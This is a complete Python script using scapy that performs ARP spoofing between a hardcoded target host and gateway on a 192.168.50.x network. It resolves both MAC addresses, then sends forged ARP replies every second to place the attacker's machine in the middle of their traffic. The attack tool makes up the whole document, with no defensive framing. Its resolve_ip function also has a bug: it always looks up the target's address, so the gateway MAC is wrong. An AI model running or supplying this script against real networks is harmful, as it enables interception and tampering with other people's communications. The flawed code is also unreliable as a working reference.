import time
from scapy.all import Ether, ARP, sendp, srp
import os
import sys

gateway_ip = "192.168.50.1"
target_ip = "192.168.50.6"

def get_mac_from_ip(ip_address: str):
    # dst="ff:ff:ff:ff:ff:ff" broadcasts the request to the whole network
    ans = srp(
        Ether(dst="ff:ff:ff:ff:ff:ff")
        / ARP(pdst=ip_address),
        timeout=2,
        verbose=0,
    )
    print(ans[0].recv)
    if ans:
        send, recv = ans[0]
        recv.display()
        return recv['ARP'].hwsrc
    else:
        return None

def resolve_ip(name: str, ip_address: str):
    print(f"Resolving MAC address for {name} {target_ip}")
    # Resolve the target's MAC address
    mac = get_mac_from_ip(target_ip)
    if mac == None:
        print(f"Unable to resolve IP address. Exiting!")
        sys.exit(0)
    print(f"Resolved to {mac}")
    return mac

# Resolve the MAC addresses
target_mac = resolve_ip("target", target_ip)
gateway_mac = resolve_ip("gateway", gateway_ip)
# Build the packets
target_packet = Ether(dst=target_mac) / ARP(
    op=2, psrc=gateway_ip, hwdst=target_mac, pdst=target_ip
)
router_packet = Ether(dst=gateway_mac) / ARP(
    op=2, psrc=target_ip, hwdst=gateway_mac, pdst=gateway_ip
)

try:
    while True:
        sendp([target_packet, router_packet], verbose=0)
        # Sleep for 1 second between beacons
        time.sleep(1)
except KeyboardInterrupt:
    sys.exit(1)
